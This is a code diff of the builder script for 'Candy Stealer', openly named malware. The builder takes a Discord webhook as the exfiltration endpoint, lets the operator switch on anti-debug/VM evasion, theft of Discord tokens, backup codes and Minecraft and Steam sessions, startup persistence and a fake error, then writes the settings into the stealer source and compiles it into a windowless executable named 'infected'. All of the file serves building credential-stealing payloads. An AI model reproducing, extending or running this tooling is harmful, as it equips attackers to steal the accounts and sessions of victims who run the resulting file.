@@ -1,105 +1,88 @@
 import re
 import os
-import ast
-import random
-import zlib
-import base64
 import subprocess
-import colorama
-import sys
-from colorama import Fore
-import pyfiglet
-import datetime
 import requests
 import getpass
-import msvcrt
-from pystyle import Center
-from rich.console import Console
-from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn                                                                                                                                                                                                                                                                                                                                                                                          # Witch❤️
-from rich import print as rprint
-from datetime import *
+import sys
+import pyfiglet
+import zipfile
+import tempfile
+from InquirerPy import prompt
+from colorama import init
 from plyer import notification
-# ======================================================================= #
-from utils.module.Obfuscators import Obfuscators 
-from utils.module.logger import log_debug, timestamp, log_warn, log_error
+from rich.console import Console
+import logging
+from rich.logging import RichHandler
 
+from utils.module.Obfuscators import Obfuscators
+
+init(autoreset=True)
 os.system("cls")
 obf = Obfuscators(include_imports=True, recursion=2)
 
-# =========================================================================================================================================================== #
-version = "1.56.3"                                                                                                                                            #
-# =========================================================================================================================================================== #
-CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup", "ERROR"]                                                 #
-# =========================================================================================================================================================== #
-ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup", "FAKE ERROR"]
-# =========================================================================================================================================================== #
-PATH = "src/stealer_core/src.py"                                                                                                                              #
-# =========================================================================================================================================================== #
-Cloud_Version = "https://raw.githubusercontent.com/nojumpdelay/Candy-stealer/refs/heads/main/builder/raw/f556WI8VKR1eciLRFaLVhU8nC"                                    #
-# =========================================================================================================================================================== #
-VersionHash = requests.get(Cloud_Version)
+logging.basicConfig(
+    level=logging.DEBUG,
+    format="%(message)s",
+    datefmt="[%X]",
+    handlers=[RichHandler(rich_tracebacks=True)]
+)
 
-hash_version = VersionHash.text.strip()
+version = "1.56.3"
+CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup", "ERROR"]
+ENABLE_KEYS = ["Anti Debug / VM", "Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup", "FAKE ERROR"]
+PATH = "src/stealer_core/src.py"
 
+console = Console()
 
-print(Fore.LIGHTMAGENTA_EX + Center.XCenter("""
- ██████╗ █████╗ ███╗   ██╗██████╗ ██╗   ██╗
-██╔════╝██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝
-██║     ███████║██╔██╗ ██║██║  ██║ ╚████╔╝ 
-██║     ██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  
-╚██████╗██║  ██║██║ ╚████║██████╔╝   ██║   
- ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   
-"""))
-print (" ")
+Candy = pyfiglet.figlet_format("Candy", font="graffiti")
+console.print(Candy,
+              justify="center",
+              highlight=True,
+              style="magenta",
+              overflow="ignore")
+
 username = getpass.getuser()
 
-if version == hash_version:
-    log_debug(f"Candy-stealer | Local Version: {version} | Cloud Version: {hash_version}")
-else:
-    log_warn(f"Outdated! | Local Version: {version} | Cloud Version: {hash_version}")
 
-def Version_Checker():
-    if version.endswith("-dev"):
-        log_warn("You are using the Dev version!")
+def ask_inputs():
+    style = {
+        "questionmark": "#ff9d00 bold",
+        "selected": "#927ba6",
+        "instruction": "",
+        "answer": "#927ba6 bold",
+        "question": "",
+    }
 
-    if version.endswith("-test"):
-      log_warn("You are using the test version!")
+    questions = [
+        {
+            "type": "input",
+            "name": "webhook",
+            "message": "Enter your Discord Webhook URL:",
+            "validate": lambda x: (
+                True if re.match(r"^https://(canary\.|ptb\.)?(discord(app)?\.com)/api/webhooks/\d+/[\w-]+$", x)
+                else "Invalid Discord Webhook URL"
+            ),
+        },
+    ]
 
-    if version.endswith("-py"):
-      log_warn("You are using the Python Version Changed version!")
+    for key, label in zip(CONFIG_KEYS, ENABLE_KEYS):
+        questions.append({
+            "type": "confirm",
+            "name": key,
+            "message": f"Enable {label}?",
+            "default": False,
+        })
 
-def ask_toggle(key):
-    print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}* {Fore.RESET}Enable {key}?:{Fore.CYAN} ", end="", flush=True)
-    while True:
-        if msvcrt.kbhit():
-            ch = msvcrt.getch().decode("utf-8").lower()
-            if ch == "y":
-                print(f"{Fore.CYAN}\b\b Yes")
-                return True
-            elif ch == "n":
-                print(f"{Fore.CYAN}\b\b No")
-                return False
-            else:
-                log_warn("Invalid")
-                print (" ")
-                print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}* {Fore.RESET}Enable {key}:{Fore.CYAN} ", end="", flush=True)
-
-
-def ask_webhook():
-    webhook_pattern = re.compile(r"^https://(canary\.|ptb\.)?(discord\.com|discordapp\.com)/api/webhooks/\d{17,20}/[A-Za-z0-9_-]{60,}")
-    while True:
-        val = input(f"{Fore.LIGHTMAGENTA_EX}?{Fore.RESET} Enter Your Webhook:{Fore.CYAN} ").strip()
-        if webhook_pattern.match(val):
-            return val
-        else:
-            log_warn("Invalid Webhook.")
+    answers = prompt(questions=questions, style=style)
+    webhook = answers.pop("webhook")
+    return webhook, answers
 
 def update_config_in_file(filepath, updated_config, webhook_url=None):
     try:
         with open(filepath, "r", encoding="utf-8") as f:
             content = f.read()
     except Exception as e:
-        log_error(f"[File Read Error] {filepath}: {e}")
+        logging.error(f"[File Read Error] {filepath}: {e}")
         return  
 
     try:
@@ -112,57 +95,63 @@ def update_config_in_file(filepath, updated_config, webhook_url=None):
         with open(filepath, "w", encoding="utf-8") as f:
             f.write(content)
 
-        log_debug("GET")
-        log_debug(f"Config {Fore.WHITE}204{Fore.RESET}")
-        log_debug(f" WebHook: {webhook_url}")
-        for key, value in updated_config.items():
-            log_debug(f"  {key}: {value}")
-
         if version.endswith("-dev"):
-            log_debug("\n[DEV MODE] Full content preview:")
-            log_debug(f"{content}")
+            logging.debug("\n[DEV MODE] Full content preview:")
+            logging.debug(f"{content}")
 
     except Exception as e:
-        log_error(f"[Update Error] Config update failed for {filepath}: {e}")
+        logging.error(f"[Update Error] Config update failed for {filepath}: {e}")
         sys.exit(1)
 
 def build():
-    url = "https://pypi.org/pypi/pyinstaller/json"
-    response = requests.get(url)
-    if response.status_code == 200:
-        data = response.json()
-        latest_version = data["info"]["version"]
-        log_debug(f"Installing Latest Build Pyinstaller | {latest_version}")
-        subprocess.run(["pip", "install", f"pyinstaller=={latest_version}"], shell=True)
-    else:
-        log_debug("Failed to fetch PyInstaller version from PyPI, installing default...")
-        subprocess.run(["pip", "install", "pyinstaller"], shell=True)
+    pyinstaller_release_url = "https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.13.1.zip"
+
+    try:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            zip_path = os.path.join(tmpdir, "pyinstaller.zip")
+            logging.debug(f"Downloading PyInstaller from GitHub: {pyinstaller_release_url}")
+            r = requests.get(pyinstaller_release_url, stream=True)
+            r.raise_for_status()
+            with open(zip_path, "wb") as f:
+                for chunk in r.iter_content(chunk_size=8192):
+                    f.write(chunk)
+            logging.debug("Download complete, extracting and installing...")
+
+            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+                zip_ref.extractall(tmpdir)
+
+            extracted_folder = None
+            for name in os.listdir(tmpdir):
+                if name.startswith("pyinstaller-"):
+                    extracted_folder = os.path.join(tmpdir, name)
+                    break
+
+            if not extracted_folder:
+                raise FileNotFoundError("Extracted PyInstaller folder not found.")
+
+            subprocess.run([sys.executable, "-m", "pip", "install", extracted_folder], check=True)
+            logging.debug("PyInstaller installed successfully from GitHub release.")
+
+    except Exception as e:
+        logging.error(f"Failed to install PyInstaller from GitHub release: {e}")
+        logging.debug("Falling back to PyPI installation...")
+        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
 
     subprocess.run(["pyinstaller", "--version"], shell=True)
     subprocess.run(["pyinstaller", "--help"], shell=True)
-    log_debug("Started Build with Pyinstaller")
+    logging.debug("Started Build with Pyinstaller")
+
     subprocess.run([
         "pyinstaller", "--onefile", "--clean", "--noconsole",
         "--name=infected", "--icon=src/ico.ico", "--upx-dir=src/upx",
-        "src/stealer_core/src.py"
+        PATH
     ], shell=True)
-    log_debug("Build Finished.")
-    notification.notify(
-    title='Build Completed.',
-    message='The build is complete, please check the dist.',
-    app_name=f'Candy Stealer Builder v{version}',
-    timeout=5  
-)
 
 def main():
-    Version_Checker()
-    config = {}
-    webhook = ask_webhook()
-    for key, label in zip(CONFIG_KEYS, ENABLE_KEYS):
-        config[key] = ask_toggle(label)
+    webhook, config = ask_inputs()
     update_config_in_file(PATH, config, webhook)
-    obf.execute(PATH)
+    # obf.execute(PATH)
     build()
 
-if __name__ == "__main__":
+if __name__ == "__main__":    
     main()
